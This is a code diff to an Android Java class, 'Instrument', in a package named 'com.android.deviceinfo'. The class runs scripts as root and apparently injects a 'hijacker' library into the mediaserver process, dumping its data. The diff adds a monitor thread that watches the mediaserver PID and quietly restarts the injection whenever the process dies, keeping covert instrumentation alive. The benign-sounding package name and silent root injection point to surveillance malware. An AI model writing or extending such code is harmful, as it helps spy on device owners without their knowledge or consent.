@@ -13,11 +13,15 @@ import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
+import com.android.deviceinfo.module.ModuleCall.EncodingTask;
 
 public class Instrument {
 	private static final String TAG = "Instrument";
 	private String proc;
 	private static String lib, hijacker, path, dumpPath, pidCompletePath, pidFile;
+	private boolean stopMonitor = false;
+	private MediaserverMonitor pidMonitor;
+	private Thread monitor;
 	
 	public Instrument(String process, String dump) {
 		final File filesPath = Status.getAppContext().getFilesDir();
@@ -79,11 +83,21 @@ public class Instrument {
 			Root.createScript(scriptName, script);
 			Execute.executeRoot(path + "/" + scriptName);
 			Root.removeScript(scriptName);
+			
+			stopMonitor = false;
+			
+			pidMonitor = new MediaserverMonitor(pid);
+			monitor = new Thread(pidMonitor);
+			monitor.start();
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(getProcessPid): unable to get pid");
 			}
 		}
+	}
+	
+	public void stopInstrumentation() {
+		stopMonitor = true;
 	}
 	
 	private int getProcessPid() {
@@ -115,5 +129,43 @@ public class Instrument {
 		}
 		
 		return pid;
+	}
+	
+	class MediaserverMonitor implements Runnable {
+		private int cur_pid, start_pid;
+		
+		public MediaserverMonitor(int p) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(MediaserverMonitor): starting");
+			}
+			
+			start_pid = p;
+		}
+		
+		@Override
+		public void run() {
+			Utils.sleep(5000);
+			
+			if (stopMonitor) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(MediaserverMonitor run): closing monitor thread");
+				}
+				
+				stopMonitor = false;
+				return;
+			}
+			
+			cur_pid = getProcessPid();
+			
+			// Mediaserver died
+			if (cur_pid != start_pid) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(MediaserverMonitor run): Mediaserver died, restarting instrumentation");
+				}
+				
+				startInstrumentation();
+				start_pid = getProcessPid();
+			}
+		}
 	}
 }
